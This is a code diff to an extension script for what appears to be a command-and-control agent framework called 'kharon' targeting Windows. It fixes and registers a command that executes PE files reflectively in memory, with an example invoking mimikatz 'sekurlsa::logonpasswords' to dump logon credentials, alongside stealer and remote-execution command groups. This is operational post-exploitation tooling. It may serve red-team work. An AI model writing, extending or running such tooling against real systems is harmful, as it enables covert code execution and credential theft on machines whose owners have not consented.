@@ -85,14 +85,14 @@ cmd_rmt_exec.addSubCommands([cmd_rmt_exec_winrm, cmd_rmt_exec_wmi, cmd_rmt_exec_
 
 // PE REFLECTION
 
-let cmd_pe-reflect = ax.create_command("pe-reflect", "Execute PE in memory", "pe-reflect -f /tmp/mimikatz.exe -a \"sekurlsa::logonpasswords\" \"exit\" ", "Task: execute PE inline");
-cmd_pe-reflect.addArgFlagFile("-f", "pe_file", true, "PE file");
-cmd_pe-reflect.addArgFlagString("-a", "args", false, "PE arguments");
-cmd_pe-reflect.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
-    let pe-reflect_file = parsed_json["pe_file"];
+let cmd_reflect = ax.create_command("reflect", "Execute PE in memory", "reflect -f /tmp/mimikatz.exe -a \"sekurlsa::logonpasswords\" \"exit\" ", "Task: execute PE inline");
+cmd_reflect.addArgFlagFile("-f", "pe_file", true, "PE file");
+cmd_reflect.addArgFlagString("-a", "args", false, "PE arguments");
+cmd_reflect.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let pe_file = parsed_json["pe_file"];
     let args = parsed_json["args"] || "";
     
-    let mod_params = ax.bof_pack("bytes,cstr", [dotnet_file, args]);
+    let mod_params = ax.bof_pack("bytes,cstr", [pe_file, args]);
     let mod_path = ax.script_dir() + "Shellcode/Reflection/Bin/pe_reflection." + ax.arch(id) + ".bin";
     let message = `Task: executing PE in-memory`;
 
@@ -233,7 +233,9 @@ cmd_stealer.addSubCommands([cmd_stealer_clipdump, cmd_stealer_screenshot, cmd_st
 var group_stealer  = ax.create_commands_group("Stealer Commands", [cmd_stealer]);
 var group_dotnet   = ax.create_commands_group("Dotnet Interactions", [cmd_dotnet]);
 var group_rmt_exec = ax.create_commands_group("Remote Execution", [cmd_rmt_exec]);
+var group_extensions = ax.create_commands_group("Extensions", [cmd_reflect]);
 
 ax.register_commands_group(group_stealer , ["kharon"], ["windows"], []);
 ax.register_commands_group(group_dotnet  , ["kharon"], ["windows"], []);
 ax.register_commands_group(group_rmt_exec, ["kharon"], ["windows"], []);
+ax.register_commands_group(group_extensions, ["kharon"], ["windows"], []);
